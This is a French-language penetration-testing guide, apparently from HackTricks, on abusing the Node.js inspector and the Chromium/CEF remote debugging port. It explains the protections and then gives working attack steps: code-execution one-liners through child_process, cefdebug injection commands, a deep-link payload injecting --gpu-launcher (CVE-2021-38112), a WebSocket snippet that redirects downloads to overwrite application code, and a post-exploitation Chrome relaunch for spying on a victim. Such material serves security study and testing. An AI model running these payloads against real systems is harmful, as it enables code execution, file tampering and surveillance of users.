# Abus de l'inspecteur Node/CEF

{{#include ../../banners/hacktricks-training.md}}

## Informations de base

[Depuis la documentation](https://origin.nodejs.org/ru/docs/guides/debugging-getting-started) : Lorsqu'il est démarré avec l'option `--inspect`, un processus Node.js écoute un client de débogage. Par **défaut**, il écoutera à l'adresse hôte et au port **`127.0.0.1:9229`**. Chaque processus se voit également attribuer un **UUID** **unique**.

Les clients de l'inspecteur doivent connaître et spécifier l'adresse hôte, le port et l'UUID pour se connecter. Une URL complète ressemblera à `ws://127.0.0.1:9229/0f2c936f-b1cd-4ac9-aab3-f63b0f33d55e`.

> [!WARNING]
> Étant donné que **le débogueur a un accès complet à l'environnement d'exécution Node.js**, un acteur malveillant capable de se connecter à ce port peut être en mesure d'exécuter du code arbitraire au nom du processus Node.js (**élévation de privilèges potentielle**).

Il existe plusieurs façons de démarrer un inspecteur :
```bash
node --inspect app.js #Will run the inspector in port 9229
node --inspect=4444 app.js #Will run the inspector in port 4444
node --inspect=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
node --inspect-brk=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
# --inspect-brk is equivalent to --inspect

node --inspect --inspect-port=0 app.js #Will run the inspector in a random port
# Note that using "--inspect-port" without "--inspect" or "--inspect-brk" won't run the inspector
```
Lorsque vous démarrez un processus inspecté, quelque chose comme ceci apparaîtra :
```
Debugger ending on ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
For help, see: https://nodejs.org/en/docs/inspector
```
Les processus basés sur **CEF** (**Chromium Embedded Framework**) doivent utiliser le paramètre : `--remote-debugging-port=9222` pour ouvrir le **debugger** (les protections SSRF restent très similaires). Cependant, ils **au lieu de** accorder une session de **debug** **NodeJS** communiqueront avec le navigateur en utilisant le [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/), qui est une interface pour contrôler le navigateur, mais il n'y a pas de RCE direct.

Lorsque vous démarrez un navigateur en mode débogage, quelque chose comme ceci apparaîtra :
```
DevTools listening on ws://127.0.0.1:9222/devtools/browser/7d7aa9d9-7c61-4114-b4c6-fcf5c35b4369
```
### Navigateurs, WebSockets et politique de même origine <a href="#browsers-websockets-and-same-origin-policy" id="browsers-websockets-and-same-origin-policy"></a>

Les sites Web ouverts dans un navigateur peuvent effectuer des requêtes WebSocket et HTTP selon le modèle de sécurité du navigateur. Une **connexion HTTP initiale** est nécessaire pour **obtenir un identifiant de session de débogage unique**. La **politique de même origine** **empêche** les sites Web de pouvoir établir **cette connexion HTTP**. Pour une sécurité supplémentaire contre les [**attaques de réaffectation DNS**](https://en.wikipedia.org/wiki/DNS_rebinding)**,** Node.js vérifie que les **en-têtes 'Host'** pour la connexion spécifient soit une **adresse IP**, soit **`localhost`** ou **`localhost6`** précisément.

> [!NOTE]
> Ces **mesures de sécurité empêchent l'exploitation de l'inspecteur** pour exécuter du code en **envoyant simplement une requête HTTP** (ce qui pourrait être fait en exploitant une vulnérabilité SSRF).

### Démarrer l'inspecteur dans les processus en cours d'exécution

Vous pouvez envoyer le **signal SIGUSR1** à un processus nodejs en cours d'exécution pour le faire **démarrer l'inspecteur** sur le port par défaut. Cependant, notez que vous devez avoir suffisamment de privilèges, donc cela pourrait vous accorder **un accès privilégié à des informations à l'intérieur du processus** mais pas une élévation de privilèges directe.
```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```
> [!NOTE]
> Cela est utile dans les conteneurs car **arrêter le processus et en démarrer un nouveau** avec `--inspect` **n'est pas une option** car le **conteneur** sera **tué** avec le processus.

### Connecter à l'inspecteur/debugger

Pour se connecter à un **navigateur basé sur Chromium**, les URL `chrome://inspect` ou `edge://inspect` peuvent être accessibles pour Chrome ou Edge, respectivement. En cliquant sur le bouton Configurer, il faut s'assurer que le **hôte cible et le port** sont correctement listés. L'image montre un exemple d'Exécution de Code à Distance (RCE) :

![](<../../images/image (674).png>)

En utilisant la **ligne de commande**, vous pouvez vous connecter à un debugger/inspecteur avec :
```bash
node inspect <ip>:<port>
node inspect 127.0.0.1:9229
# RCE example from debug console
debug> exec("process.mainModule.require('child_process').exec('/Applications/iTerm.app/Contents/MacOS/iTerm2')")
```
L'outil [**https://github.com/taviso/cefdebug**](https://github.com/taviso/cefdebug) permet de **trouver des inspecteurs** s'exécutant localement et **d'injecter du code** dans ceux-ci.
```bash
#List possible vulnerable sockets
./cefdebug.exe
#Check if possibly vulnerable
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.version"
#Exploit it
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.mainModule.require('child_process').exec('calc')"
```
> [!NOTE]
> Notez que les **exploits RCE NodeJS ne fonctionneront pas** s'ils sont connectés à un navigateur via le [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) (vous devez vérifier l'API pour trouver des choses intéressantes à faire avec).

## RCE dans le Débogueur/Inspecteur NodeJS

> [!NOTE]
> Si vous êtes ici pour savoir comment obtenir [**RCE à partir d'un XSS dans Electron, veuillez consulter cette page.**](../../network-services-pentesting/pentesting-web/electron-desktop-apps/index.html)

Certaines façons courantes d'obtenir **RCE** lorsque vous pouvez **vous connecter** à un **inspecteur** Node sont d'utiliser quelque chose comme (il semble que cela **ne fonctionnera pas dans une connexion au protocole Chrome DevTools**):
```javascript
process.mainModule.require("child_process").exec("calc")
window.appshell.app.openURLInDefaultBrowser("c:/windows/system32/calc.exe")
require("child_process").spawnSync("calc.exe")
Browser.open(JSON.stringify({ url: "c:\\windows\\system32\\calc.exe" }))
```
## Chrome DevTools Protocol Payloads

Vous pouvez consulter l'API ici : [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/)\
Dans cette section, je vais simplement lister des choses intéressantes que j'ai trouvées que des gens ont utilisées pour exploiter ce protocole.

### Injection de Paramètres via Deep Links

Dans le [**CVE-2021-38112**](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/), Rhino Security a découvert qu'une application basée sur CEF **avait enregistré un URI personnalisé** dans le système (workspaces://index.html) qui recevait l'URI complet et **lancait l'application basée sur CEF** avec une configuration partiellement construite à partir de cet URI.

Il a été découvert que les paramètres URI étaient décodés en URL et utilisés pour lancer l'application de base CEF, permettant à un utilisateur d'**injecter** le drapeau **`--gpu-launcher`** dans la **ligne de commande** et d'exécuter des choses arbitraires.

Donc, un payload comme :
```
workspaces://anything%20--gpu-launcher=%22calc.exe%22@REGISTRATION_CODE
```
Va exécuter un calc.exe.

### Écraser des fichiers

Changez le dossier où **les fichiers téléchargés vont être enregistrés** et téléchargez un fichier pour **écraser** le **code source** fréquemment utilisé de l'application avec votre **code malveillant**.
```javascript
ws = new WebSocket(url) //URL of the chrome devtools service
ws.send(
JSON.stringify({
id: 42069,
method: "Browser.setDownloadBehavior",
params: {
behavior: "allow",
downloadPath: "/code/",
},
})
)
```
### Webdriver RCE et exfiltration

Selon ce post : [https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148](https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148), il est possible d'obtenir RCE et d'exfiltrer des pages internes de theriver.

### Post-Exploitation

Dans un environnement réel et **après avoir compromis** un PC utilisateur utilisant un navigateur basé sur Chrome/Chromium, vous pourriez lancer un processus Chrome avec le **débogage activé et rediriger le port de débogage** afin d'y accéder. De cette manière, vous serez en mesure de **inspecter tout ce que la victime fait avec Chrome et de voler des informations sensibles**.

La méthode discrète consiste à **terminer chaque processus Chrome** et ensuite appeler quelque chose comme
```bash
Start-Process "Chrome" "--remote-debugging-port=9222 --restore-last-session"
```
## Références

- [https://www.youtube.com/watch?v=iwR746pfTEc\&t=6345s](https://www.youtube.com/watch?v=iwR746pfTEc&t=6345s)
- [https://github.com/taviso/cefdebug](https://github.com/taviso/cefdebug)
- [https://iwantmore.pizza/posts/cve-2019-1414.html](https://iwantmore.pizza/posts/cve-2019-1414.html)
- [https://bugs.chromium.org/p/project-zero/issues/detail?id=773](https://bugs.chromium.org/p/project-zero/issues/detail?id=773)
- [https://bugs.chromium.org/p/project-zero/issues/detail?id=1742](https://bugs.chromium.org/p/project-zero/issues/detail?id=1742)
- [https://bugs.chromium.org/p/project-zero/issues/detail?id=1944](https://bugs.chromium.org/p/project-zero/issues/detail?id=1944)
- [https://nodejs.org/en/docs/guides/debugging-getting-started/](https://nodejs.org/en/docs/guides/debugging-getting-started/)
- [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/)
- [https://larry.science/post/corctf-2021/#saasme-2-solves](https://larry.science/post/corctf-2021/#saasme-2-solves)
- [https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/](https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/)

{{#include ../../banners/hacktricks-training.md}}
